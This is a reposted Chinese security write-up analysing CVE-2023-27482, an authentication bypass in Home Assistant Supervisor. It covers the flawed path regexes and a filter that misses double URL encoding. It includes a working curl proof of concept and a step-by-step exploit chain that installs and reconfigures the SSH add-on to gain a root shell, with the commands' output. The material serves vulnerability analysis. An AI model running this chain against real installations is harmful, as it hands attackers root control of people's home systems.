---
title: CVE-2023-27482  Home Assistant 权限绕过致远程代码执行漏洞
url: https://buaq.net/go-166237.html
source: unSafe.sh - 不安全
date: 2023-05-30
fetch_date: 2025-10-04T11:37:49.473694
---

# CVE-2023-27482  Home Assistant 权限绕过致远程代码执行漏洞

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/23a871ef20c97e3e2155a4bd64b11a9a.jpg)

CVE-2023-27482 Home Assistant 权限绕过致远程代码执行漏洞

Home Assistant是一套开源的家庭自动化管理系统。该系统主要用于控制家庭自动化设备。Home Assistant Supervisor 2023.01.
*2023-5-29 17:59:0
Author: [xz.aliyun.com(查看原文)](/jump-166237.htm)
阅读量:66
收藏*

---

Home Assistant是一套开源的家庭自动化管理系统。该系统主要用于控制家庭自动化设备。

Home Assistant Supervisor < 2023.01.1

## 源码分析

这是一个权限验证的问题，其实也是一个路径遍历引起的问题，在最新版本可以看到补丁，我们直接用2023.2.0进行分析：
在http.py文件中我们可以看到有几个正则表达式：
![](https://cdn.nlark.com/yuque/0/2023/png/32586364/1684168399439-b0ac8858-86e2-4aaa-b2df-87659656ccd6.png#averageHue=%23222121&clientId=u2fea4c6f-04ba-4&from=paste&height=383&id=ua7ef5fec&originHeight=383&originWidth=765&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40044&status=done&style=none&taskId=ufc154404-101b-4069-967d-a0005d4bf8d&title=&width=765)

```
class HassIOView(HomeAssistantView):
    """Hass.io view to handle base part."""

    name = "api:hassio"
    url = "/api/hassio/{path:.+}"
    requires_auth = False

    def __init__(self, host: str, websession: aiohttp.ClientSession) -> None:
        """Initialize a Hass.io base view."""
        self._host = host
        self._websession = websession

    async def _handle(
        self, request: web.Request, path: str
    ) -> web.Response | web.StreamResponse:
        """Route data to Hass.io."""
        hass = request.app["hass"]
        if _need_auth(hass, path) and not request[KEY_AUTHENTICATED]:
            return web.Response(status=HTTPStatus.UNAUTHORIZED)

        return await self._command_proxy(path, request)

    delete = _handle
    get = _handle
    post = _handle

    async def _command_proxy(
        self, path: str, request: web.Request
    ) -> web.StreamResponse:
        """Return a client request with proxy origin for Hass.io supervisor.

        This method is a coroutine.
        """
        headers = _init_header(request)
        if path == "backups/new/upload":
            # We need to reuse the full content type that includes the boundary
            headers[
                CONTENT_TYPE
            ] = request._stored_content_type  # pylint: disable=protected-access

        try:
            client = await self._websession.request(
                method=request.method,
                url=f"http://{self._host}/{path}",
                params=request.query,
                data=request.content,
                headers=headers,
                timeout=_get_timeout(path),
            )

            # Stream response
            response = web.StreamResponse(
                status=client.status, headers=_response_header(client, path)
            )
            response.content_type = client.content_type

            await response.prepare(request)
            async for data in client.content.iter_chunked(4096):
                await response.write(data)

            return response

        except aiohttp.ClientError as err:
            _LOGGER.error("Client error on api %s request %s", path, err)

        except asyncio.TimeoutError:
            _LOGGER.error("Client timeout error on API request %s", path)

        raise HTTPBadGateway()
```

这段代码的作用相信大家都能看懂，首先映入眼帘的就是几个正则表达式：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230529175952-8e56b5c0-fe07-1.png)
然后就是构造函数初始化，其中有一个aiohttp.ClientSession的实例websession，host是主机地址，接下来的handle从注释上看就是一个路由，再往下的\_command\_proxy就是代理了。
这段代码的作用就是将http请求代理到Hass.io supervisor（在注释Return a client request with proxy origin for Hass.io supervisor中已经写得很明了），具体实现方法是这个：\_command\_proxy。
在代码的75行或者上面代码块的21行调用了这个方法进行返回，那么我们看看前面是怎么做的。
代码的第59行或者上面代码块的第5行定义了一个名为url的字符串：
url = "/api/hassio/{path:.+}"，这其中包含了正则表达式，也就是说传入的数据可以是/api/hassio/后拼接一个路径，这个路径是很危险的，因为可以包含"/"这样一个东西，不过这里还不足以证明漏洞，要看拼接的path是否有危害就继续来看这个path是怎么来的。
在handle这个方法中我们第一次看到了path的出现，紧接着是一个if方法调用了\_need\_auth方法：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230529175952-8e81b3f6-fe07-1.png)
从名字上和返回值上看的确像是一个权限认证的方法，直接跳过去看看：
果然在最下方看到了这个鉴权用的函数，接受一个字符串类型的path，这可要仔细看看。

```
def _need_auth(hass, path: str) -> bool:
    """Return if a path need authentication."""
    if not async_is_onboarded(hass) and NO_AUTH_ONBOARDING.match(path):
        return False
    if NO_AUTH.match(path):
        return False
    return True
```

这里使用了一个match函数来判断这个path，那么是用什么来match的呢，一看原来是最开始的两个正则表达式：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230529175952-8ea69a36-fe07-1.png)
稳得很啊老铁app/.\*那不就是任意字符串么拼接一个../就是目录穿越了。
那么也就是说传入的path能和NO\_AUTH的正则匹配上，那就可以返回false跳过权限认证，在线测试一下：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230529175953-8ed65686-fe07-1.png)
果然是可行的！
既然这里可以进行攻击，那么就要看传入的数据有没有被过滤了，全局搜索filter相关字段，最后在http目录下的security\_filter.py中发现了过滤请求用的正则表达式：
![](https://xzfile.aliyuncs.com/media/upload/picture/20230529175953-8f0292aa-fe07-1.png)
很显然，对文件的过滤并没有包含双重url编码，比如：r"|(%25|%252E|%2E){2,}/?+"也就是说可以绕过。
poc：
curl <http://127.0.0.1:8123/api/hassio/app/.%252e/supervisor/info>

另外此漏洞还可以配合[addon-ssh](https://github.com/hassio-addons/addon-ssh)组件进行RCE
利用链为：

```
/api/hassio/app/.%252e/store/addons/a0d7b954_ssh/install
/api/hassio/app/.%252e/addons/a0d7b954_ssh/security -H 'Content-Type: application/json' -d '{"protected":"false"}'
/api/hassio/app/.%252e/addons/a0d7b954_ssh/options -H 'Content-Type: application/json' -d '{"options":{"init_commands":[],"packages":[],"share_sessions":false,"ssh":{"allow_agent_forwarding":false,"allow_remote_port_forwarding":false,"allow_tcp_forwarding":false,"authorized_keys":[],"compatibility_mode":false,"password":"hunter2","sftp":false,"username":"hassio"},"zsh":true}}'
/api/hassio/app/.%252e/addons/a0d7b954_ssh/restart
ssh连接

也就是
# curl -X POST http://127.0.0.1:8123/api/hassio/app/.%252e/store/addons/a0d7b954_ssh/install
{"result": "ok", "data": {}}
# curl -X POST http://127.0.0.1:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/security -H 'Content-Type: application/json' -d '{"protected":"false"}'
{"result": "ok", "data": {}}
# curl -X POST http://127.0.0.1:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/options -H 'Content-Type: application/json' -d '{"options":{"init_commands":[],"packages":[],"share_sessions":false,"ssh":{"allow_agent_forwarding":false,"allow_remote_port_forwarding":false,"allow_tcp_forwarding":false,"authorized_keys":[],"compatibility_mode":false,"password":"hunter2","sftp":false,"username":"hassio"},"zsh":true}}'
{"result": "ok", "data": {}}
# curl -X POST http://127.0.0.1:8123/api/hassio/app/.%252e/addons/a0d7b954_ssh/restart
{"result": "ok", "data": {}}
# ssh 127.0.0.1 -p22 -lhassio
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:cndiIDNABHXCYDKFJdnjKIO/+njktdnBHXJZI+nnjkX.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
[email protected]'s password:

| |  | |                          /\           (_)   | |            | |
| |__| | ___  _ __ ___   ___     /  \   ___ ___ _ ___| |_ __ _ _ __ | |_
|  __  |/ _ \| '_ \ _ \ / _ \   / /\ \ / __/ __| / __| __/ _\ | '_ \| __|
| |  | | (_) | | | | | |  __/  / ____ \\__ \__ \ \__ \ || (_| | | | | |_
|_|  |_|\___/|_| |_| |_|\___| /_/    \_\___/___/_|___/\__\__,_|_| |_|\__|

Welcome to the Home Assistant command line.

System information
IPv4 addresses for enp0s3: 127.0.0.1/24
IPv6 addresses for enp0s3: fe80::494d:126b:afb:d3a7/64

OS Version:               Home Assistant OS 9.5
Home Assistant Core:      2023.2.5

Home Assistant URL:       http://homeassistant.local:8123
Observer URL:             http://homeassistant.local:4357
➜  ~ id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),...